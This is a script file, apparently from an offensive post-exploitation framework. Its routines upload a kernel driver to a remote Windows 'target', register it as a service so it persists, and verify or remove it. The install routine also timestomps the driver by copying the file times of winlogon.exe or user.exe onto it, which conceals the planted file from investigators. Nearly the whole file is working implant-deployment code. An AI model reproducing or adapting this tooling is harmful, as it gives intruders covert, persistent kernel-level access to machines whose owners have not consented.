@include "_File.dsi";
@include "_VersionChecks.dsi";
@include "windows/_PathsWindows.dsi";

#--------------------------------------------------------------------------
# _DriverInstall
#	Copies driver to target and creates registry settings.
# 
# Params:
#	IN STRING $project
#		The project name
#	IN STRING $drvName
#		Name of Driver
#	IN STRING $localDriverName
#		Local name of the driver relative to the "Resources" dir
#	IN INT $startValue
#		Start value for driver (registry value)
#	IN INT $typeValue
#		Type of driver (registry value)
#--------------------------------------------------------------------------
sub _DriverInstall(IN STRING $project,
				   IN STRING $drvName,
				   IN STRING $localDriverName,
				   IN INT $startValue,
				   IN INT $typeValue)
{
	return _DriverInstall( $project, $drvName, $localDriverName, $startValue, $typeValue, true );
}

#--------------------------------------------------------------------------
# _DriverInstall
#	Copies driver to target and creates registry settings.
# 
# Params:
#	IN STRING $project
#		The project name
#	IN STRING $drvName
#		Name of Driver
#	IN STRING $localDriverName
#		Local name of the driver relative to the "Resources" dir
#	IN INT $startValue
#		Start value for driver (registry value)
#	IN INT $typeValue
#		Type of driver (registry value)
#	IN BOOL $ask
#		Ask user for confirmation of install
#--------------------------------------------------------------------------
sub _DriverInstall(IN STRING $project,
				   IN STRING $drvName,
				   IN STRING $localDriverName,
				   IN INT $startValue,
				   IN INT $typeValue,
				   IN BOOL $ask)
{
	
	@disablewow64 on;
	
	if ($drvName == "") {
		echo("* Invalid driver name given", ERROR);
		return false;
	}

	if ($ask && !prompt("Do you want to install the $project driver ($drvName)?")) {
		return false;
	}

	@record on;

	# get the root directory
	string $system, $root;
	if (!_GetSystemPaths($system, $root)) {
		echo("* Unable to determine system root", ERROR);
		return false;
	}
	string $systemroot = "$system\\$root";

	# make sure it's not already installed
	if (`registryquery -hive L -key SYSTEM\\CurrentControlSet\\Services\\$drvName`) {
		echo("$project ($drvName) is already installed (key exists)", ERROR);
		return false;
	}

	if (_FileExists("$drvName.sys", "$systemroot\\drivers")) {
		echo("$project ($drvName) is already installed (file exists)", ERROR);
		return false;
	}

	#---------------------------
	# Driver not installed
	#---------------------------

	# put the driver
	echo "Uploading the SYS";
	
	if (`put "$localDriverName" -name "$systemroot\\drivers\\$drvName.sys" -permanent -project $project`) {
		echo("    SUCCESS", GOOD);
	} else {
		echo("    FAILED", ERROR);
		return false;
	}

	# match file times for driver
	echo "Matching file time for SYS";
	string $matchFile;
	if (_IsOs64Bit())
	{
		$matchFile = "$systemroot\\winlogon.exe";
	}
	else
	{
		$matchFile = "$systemroot\\user.exe";
	}	
	if (`matchfiletimes -src "$matchFile" -dst "$systemroot\\drivers\\$drvName.sys"`) {
		echo("    SUCCESS", GOOD);
	} else {
		echo("    FAILED (but continuing anyway)", WARNING);
	}

	# add the registry keys
	bool $keysAdded = true;
	echo "Adding registry keys";
	
	if (!`registryadd -hive L -key SYSTEM\\CurrentControlSet\\Services\\$drvName`) {
	    $keysAdded = false;
	} else if (!`registryadd -hive L -key SYSTEM\\CurrentControlSet\\Services\\$drvName -value ErrorControl -type REG_DWORD -data 0`) {
	    $keysAdded = false;
	} else if (!`registryadd -hive L -key SYSTEM\\CurrentControlSet\\Services\\$drvName -value Start -type REG_DWORD -data $startValue`) {
	    $keysAdded = false;
	} else if (!`registryadd -hive L -key SYSTEM\\CurrentControlSet\\Services\\$drvName -value Type -type REG_DWORD -data $typeValue`) {
	    $keysAdded = false;
	}

	if ($keysAdded == false) {
	    echo("    FAILED", ERROR);
	    return false;
	} else {
	    echo("    SUCCESS", GOOD);
	}

	return true;

}	/* end _DriverInstall */

#--------------------------------------------------------------------------
# _DriverUnInstall
#	Called by DriverMenu to remove the driver from the target and
#	cleanup registry settings.
# 
# Params:
#	IN STRING $project
#		The project name
#	IN STRING $drvName
#		Name of Driver
#--------------------------------------------------------------------------
sub _DriverUnInstall(IN STRING $project,
					 IN STRING $drvName)
{
	return _DriverUnInstall( $project, $drvName, true );
}

#--------------------------------------------------------------------------
# _DriverUnInstall
#	Called by DriverMenu to remove the driver from the target and
#	cleanup registry settings.
# 
# Params:
#	IN STRING $project
#		The project name
#	IN STRING $drvName
#		Name of Driver
#	IN BOOL $ask
#		Ask user for confirmation of uninstall
#--------------------------------------------------------------------------
sub _DriverUnInstall(IN STRING $project,
					 IN STRING $drvName,
					 IN BOOL $ask)
{
	
	@disablewow64 on;
	
	bool $rtn = true;

	if ($drvName == "") {
		echo("Invalid driver name given", ERROR);
		return false;
	}

	if ($ask && !prompt("Do you want to uninstall the $project driver ($drvName)?")) {
		return false;
	}

	# get the root directory
	string $system;
	string $root;
	if (!_GetSystemPaths($system, $root)) {
		echo("* Unable to determine system root", ERROR);
		return false;
	}
	string $systemroot = "$system\\$root";

	echo "Unloading driver";
	if (`drivers -unload $drvName`) {
		echo("    SUCCESS", GOOD);
	} else {
		echo("    FAILED", ERROR);
		$rtn = false;
	}

	echo "Removing registry key";
	if (`registrydelete -hive L -key SYSTEM\\CurrentControlSet\\Services\\$drvName -recursive`) {
		echo("    SUCCESS", GOOD);
	} else {
		echo("    FAILED", ERROR);
		$rtn = false;

	}

	echo "Removing $drvName.sys";
	if (`delete -file "$systemroot\\drivers\\$drvName.sys"`) {
		echo("    SUCCESS", GOOD);
	} else {
		echo("    FAILED", ERROR);
		$rtn = false;
		
	}

	return $rtn;

}	/* end _DriverUninstall */

#--------------------------------------------------------------------------
# _DriverVerifyInstall
#	Called by DriverMenu to remove the driver from the target and
#	cleanup registry settings.
# 
# Params:
#	IN STRING $drvName
#		Name of Driver
#	IN INT $startValue
#		Start value for driver (registry value)
#	IN INT $typeValue
#		Type of driver (registry value)
#--------------------------------------------------------------------------
sub _DriverVerifyInstall(IN STRING $drvName, 
						 IN INT $startValue,
						 IN INT $typeValue)
{

	@disablewow64 on;
	
	if ($drvName == "") {
		echo("* Invalid driver name given", ERROR);
		return false;
	}

	# get the root directory
	string $system;
	string $root;
	if (!_GetSystemPaths($system, $root)) {
		echo("* Unable to determine system root", ERROR);
		return false;
	}
	string $systemroot = "$system\\$root";

	bool $rtn = true;
	echo "Checking for $drvName.sys";
	if (_FileExists("$drvName.sys", "$systemroot\\drivers")) {
		echo("    SUCCESS", GOOD);
	} else {
		echo("    FAILED", ERROR);
		$rtn = false;
	}

	@record on;

	echo "Checking for key";
	if (`registryquery -hive L -key SYSTEM\\CurrentControlSet\\Services\\$drvName`) {
		echo("    SUCCESS", GOOD);
	} else {
		echo("    FAILED", ERROR);
		$rtn = false;
	}

	echo "Checking for key/ErrorControl";
	if (`registryquery -hive L -key SYSTEM\\CurrentControlSet\\Services\\$drvName -value ErrorControl`) {
	    # got key -- check value
	    bool $valueGood = false;
	    string $type;
	    if (GetCmdData("Key::Value::type", $type) && ($type == "REG_DWORD")) {
			string $data;
			if (GetCmdData("Key::Value::value", $data) && 
				(StrLen($data) > 0) &&
				(<int>$data == 0)) {
				$valueGood = true;
			}
	    }

	    if ($valueGood) {
			echo("    SUCCESS", GOOD);
	    } else {
			echo("    FAILED (value is bad)", ERROR);
			$rtn = false;
	    }	
	} else {
	    echo("    FAILED (value not found)", ERROR);
	    $rtn = false;
	}

	echo "Checking for key/Start";
	if (`registryquery -hive L -key SYSTEM\\CurrentControlSet\\Services\\$drvName -value Start`) {
	    # got key -- check value
	    bool $valueGood = false;
	    string $type;
	    if (GetCmdData("Key::Value::type", $type) && ($type == "REG_DWORD")) {
			string $data;
			if (GetCmdData("Key::Value::value", $data) && 
				(StrLen($data) > 0) &&
				(<int>$data == $startValue)) {
				$valueGood = true;
			}
	    }

	    if ($valueGood) {
			echo("    SUCCESS", GOOD);
	    } else {
			echo("    FAILED (value is bad)", ERROR);
			$rtn = false;
	    }	
	} else {
	    echo("    FAILED (value not found)", ERROR);
	    $rtn = false;
	}

	echo "Checking for key/Type";
	if (`registryquery -hive L -key SYSTEM\\CurrentControlSet\\Services\\$drvName -value Type`) {
	    # got key -- check value
	    bool $valueGood = false;
	    string $type;
	    if (GetCmdData("Key::Value::type", $type) && ($type == "REG_DWORD")) {
			string $data;
			if (GetCmdData("Key::Value::value", $data) &&
				(StrLen($data) > 0) &&
				(<int>$data == $typeValue)) {
				$valueGood = true;
			}
	    }

	    if ($valueGood) {
			echo("    SUCCESS", GOOD);
	    } else {
			echo("    FAILED (value is bad)", ERROR);
			$rtn = false;
	    }	
	} else {
	    echo("    FAILED (value not found)", ERROR);
	    $rtn = false;
	}

	return $rtn;

}	/* end _DriverVerifyInstall */

#--------------------------------------------------------------------------
# _DriverVerifyRunning
#	Called by DriverMenu to remove the driver from the target and
#	cleanup registry settings.
# 
# Params:
#	IN STRING $drvName
#		Name of Driver
#--------------------------------------------------------------------------
sub _DriverVerifyRunning(IN STRING $drvName)
{

	@disablewow64 on;

	if ($drvName == "") {
		echo("Invalid driver name given", ERROR);
		return false;
	}

	@record on;

	echo "Getting driver list";
	if (`drivers -list -minimal`) {
		echo("    SUCCESS", GOOD);
	} else {
		echo("    FAILED (query of running drivers failed)", ERROR);
		return false;
	}

	object $drivers;
	GetCmdData("DriverItem", $drivers);

	echo "Checking for $drvName";
	int $i=0;
	while ($i < sizeof($drivers)) {
		string $name;
		GetObjectData($drivers[$i], "Name", $name);
		string $namePieces;
		SplitPath($name, $namePieces);
		if (defined($namePieces[1])) {
		    if (($namePieces[1] == $drvName) || ($namePieces[1] == "$drvName.sys")) {
				echo("    SUCCESS", GOOD);
				return true;
		    }
		}
		$i++;
	}

	echo("    FAILED (driver not running)", ERROR);
	return false;

}	/* end _DriverVerifyRunning */
